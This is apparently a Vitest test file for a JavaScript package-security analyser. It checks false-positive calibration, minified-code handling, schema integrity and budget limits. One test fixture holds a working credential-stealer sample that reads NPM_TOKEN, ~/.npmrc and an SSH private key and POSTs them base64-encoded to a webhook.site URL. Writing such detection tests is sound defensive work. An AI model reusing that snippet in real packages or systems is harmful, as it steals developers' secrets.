import { describe, expect, it } from "vitest";
import type { Finding, Severity } from "@packagegate/shared";
import { FindingSchema } from "@packagegate/shared";
import { analyseFile, analysePackage, RULES_VERSION } from "./analyse.js";

const SEVERITY_ORDER: readonly Severity[] = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"];

function atOrAbove(findings: readonly Finding[], minimum: Severity): Finding[] {
  const floor = SEVERITY_ORDER.indexOf(minimum);
  return findings.filter((finding) => SEVERITY_ORDER.indexOf(finding.severity) >= floor);
}

/**
 * A file shaped like a real build tool: it spawns a compiler, reads
 * configuration from the environment, reads and writes files, and asks the OS
 * what platform it is on. Every one of those is a capability a scanner can
 * detect. None of them, alone or together, is evidence of anything — and if
 * this file produced a high-severity finding, the analyser would be flagging a
 * large share of the registry.
 */
const BENIGN_BUILD_TOOL = [
  `import { execFileSync } from "node:child_process";`,
  `import fs from "node:fs";`,
  `import os from "node:os";`,
  `import path from "node:path";`,
  ``,
  `const isProduction = process.env.NODE_ENV === "production";`,
  `const cacheRoot = process.env.CACHE_DIR ?? path.join(os.tmpdir(), "build-cache");`,
  ``,
  `export function build(entry) {`,
  `  const config = JSON.parse(fs.readFileSync("tsconfig.json", "utf8"));`,
  `  const outDir = config.compilerOptions?.outDir ?? "dist";`,
  `  fs.mkdirSync(path.join(outDir, os.platform()), { recursive: true });`,
  `  execFileSync("tsc", ["-p", "tsconfig.json"], { stdio: "inherit" });`,
  `  fs.writeFileSync(path.join(outDir, "manifest.json"), JSON.stringify({ entry }));`,
  `  if (!isProduction) {`,
  `    fs.appendFileSync(path.join(cacheRoot, "log.txt"), "built\\n");`,
  `  }`,
  `  return outDir;`,
  `}`,
  ``,
].join("\n");

describe("calibration — a legitimate build tool", () => {
  it("produces no finding above LOW", () => {
    const findings = analyseFile({
      path: "lib/build.js",
      content: BENIGN_BUILD_TOOL,
    }).findings;
    expect(atOrAbove(findings, "MEDIUM")).toEqual([]);
  });

  it("still records the capabilities it uses, so coverage is honest", () => {
    const findings = analyseFile({
      path: "lib/build.js",
      content: BENIGN_BUILD_TOOL,
    }).findings;
    const found = new Set(findings.map((finding) => finding.category));
    expect(found.has("PROCESS_EXECUTION")).toBe(true);
    expect(found.has("ENVIRONMENT_ACCESS")).toBe(true);
    expect(found.has("FILESYSTEM_READ")).toBe(true);
    expect(found.has("FILESYSTEM_WRITE")).toBe(true);
    expect(found.has("SYSTEM_INFORMATION_ACCESS")).toBe(true);
  });

  it("scores a whole benign package with no high-severity findings", () => {
    const result = analysePackage({
      scripts: { build: "node scripts/build.js", test: "vitest run" },
      files: [
        { path: "lib/build.js", content: BENIGN_BUILD_TOOL },
        { path: "index.js", content: `export { build } from "./lib/build.js";\n` },
      ],
    });
    expect(atOrAbove(result.findings, "HIGH")).toEqual([]);
    expect(result.rulesVersion).toBe(RULES_VERSION);
  });
});

describe("calibration — minified code is not evidence of anything", () => {
  const readable = [
    `const cp = require("child_process");`,
    `const token = process.env.NPM_TOKEN;`,
    `function publish(tag) {`,
    `  return cp.execSync("npm publish --tag " + tag);`,
    `}`,
    `module.exports = { publish, token };`,
    ``,
  ].join("\n");

  // The same program on one long line, which is what a bundler produces.
  const minified =
    `const cp=require("child_process"),token=process.env.NPM_TOKEN;` +
    `function publish(t){return cp.execSync("npm publish --tag "+t)}` +
    `module.exports={publish:publish,token:token};` +
    `/*${"padding ".repeat(200)}*/`;

  it("classifies the bundled form as minified", () => {
    expect(
      analyseFile({ path: "dist/index.js", content: minified }).report.minified,
    ).toBe(true);
    expect(analyseFile({ path: "lib/index.js", content: readable }).report.minified).toBe(
      false,
    );
  });

  it("does not raise severity for the minified form", () => {
    const plain = analyseFile({ path: "lib/index.js", content: readable }).findings;
    const bundled = analyseFile({ path: "dist/index.js", content: minified }).findings;

    const severitiesFor = (findings: readonly Finding[]): string[] =>
      findings.map((finding) => `${finding.ruleId}:${finding.severity}`).sort();

    expect(severitiesFor(bundled)).toEqual(severitiesFor(plain));
  });

  it("emits no obfuscation finding merely because a file is minified", () => {
    const bundled = analyseFile({ path: "dist/index.js", content: minified }).findings;
    expect(bundled.filter((f) => f.category === "OBFUSCATION_SIGNAL")).toEqual([]);
  });

  it("lowers confidence in the minified form, as the risk model prescribes", () => {
    const bundled = analyseFile({ path: "dist/index.js", content: minified }).findings;
    const credential = bundled.find(
      (finding) => finding.category === "CREDENTIAL_RELATED_ACCESS",
    );
    expect(credential?.severity).toBe("HIGH");
    expect(credential?.confidence).toBe("MEDIUM");
  });
});

describe("calibration — a credential-stealer shape does reach HIGH", () => {
  it("reports the credential read, the credential path and the collector host", () => {
    const source = [
      `const fs = require("fs");`,
      `const os = require("os");`,
      `const https = require("https");`,
      ``,
      `const payload = {`,
      `  npm: process.env.NPM_TOKEN,`,
      `  rc: fs.readFileSync(os.homedir() + "/.npmrc", "utf8"),`,
      `  ssh: fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8"),`,
      `};`,
      ``,
      `https.request("https://webhook.site/abc-123", { method: "POST" }).end(`,
      `  Buffer.from(JSON.stringify(payload)).toString("base64"),`,
      `);`,
      ``,
    ].join("\n");

    const findings = analyseFile({
      path: "scripts/install.js",
      content: source,
    }).findings;
    const found = new Set(findings.map((finding) => finding.category));

    expect(found.has("CREDENTIAL_RELATED_ACCESS")).toBe(true);
    expect(found.has("PACKAGE_MANAGER_ACCESS")).toBe(true);
    expect(found.has("NETWORK_DESTINATION")).toBe(true);
    expect(atOrAbove(findings, "HIGH").length).toBeGreaterThanOrEqual(3);
  });
});

describe("result integrity", () => {
  it("produces findings that satisfy the shared schema", () => {
    const result = analysePackage({
      scripts: { postinstall: "node scripts/install.js" },
      files: [
        {
          path: "scripts/install.js",
          content: `const cp = require("child_process");\ncp.exec("echo " + process.env.HOME);\n`,
        },
      ],
    });
    expect(result.findings.length).toBeGreaterThan(0);
    for (const finding of result.findings) {
      expect(() => FindingSchema.parse(finding)).not.toThrow();
    }
  });

  it("accounts for every input file exactly once", () => {
    const files = [
      { path: "a.js", content: "module.exports = 1;\n" },
      { path: "b.ts", content: "export const b = 2;\n" },
      { path: "c.json", content: `{"x":1}` },
      { path: "d.js", content: "function ( { ] ) => ???" },
    ];
    const result = analysePackage({ files });
    expect(result.files).toHaveLength(files.length);
    expect(new Set(result.files.map((file) => file.path)).size).toBe(files.length);
    expect(result.parseFailures).toHaveLength(1);
    expect(result.parseFailures[0]?.filePath).toBe("d.js");
  });

  it("never reports an absolute host path in a location", () => {
    const result = analysePackage({
      files: [{ path: "lib/x.js", content: `require("child_process").exec("ls");\n` }],
    });
    for (const finding of result.findings) {
      expect(finding.location.filePath.startsWith("/")).toBe(false);
    }
  });

  it("is deterministic across runs", () => {
    const input = {
      scripts: { postinstall: "node scripts/install.js" },
      files: [
        {
          path: "scripts/install.js",
          content: `const cp = require("child_process");\ncp.exec("ls");\n`,
        },
      ],
    };
    const first = analysePackage(input).findings.map((finding) => finding.id);
    const second = analysePackage(input).findings.map((finding) => finding.id);
    expect(first).toEqual(second);
  });
});

describe("budgets are recorded, never silent", () => {
  it("records a notice when traversal stops at the node budget", () => {
    const source = Array.from(
      { length: 400 },
      (_, index) => `const v${String(index)} = process.env.X${String(index)};`,
    ).join("\n");
    const analysis = analyseFile(
      { path: "big.js", content: `${source}\n` },
      { limits: { maxNodesPerFile: 100 } },
    );
    expect(analysis.report.analysed).toBe(false);
    expect(
      analysis.limitNotices.some((notice) => notice.limit === "maxNodesPerFile"),
    ).toBe(true);
  });

  it("caps findings for the whole package and says so", () => {
    const source = Array.from(
      { length: 60 },
      (_, index) => `const v${String(index)} = process.env.X${String(index)};`,
    ).join("\n");
    const result = analysePackage(
      {
        files: [
          { path: "a.js", content: `${source}\n` },
          { path: "b.js", content: `${source}\n` },
        ],
      },
      { limits: { maxFindingsTotal: 10, maxFindingsPerRulePerFile: 100 } },
    );
    expect(result.findings.length).toBeLessThanOrEqual(10);
    expect(
      result.limitNotices.some(
        (notice) =>
          notice.limit === "maxFindingsTotal" || notice.limit === "maxFindingsPerFile",
      ),
    ).toBe(true);
  });
});
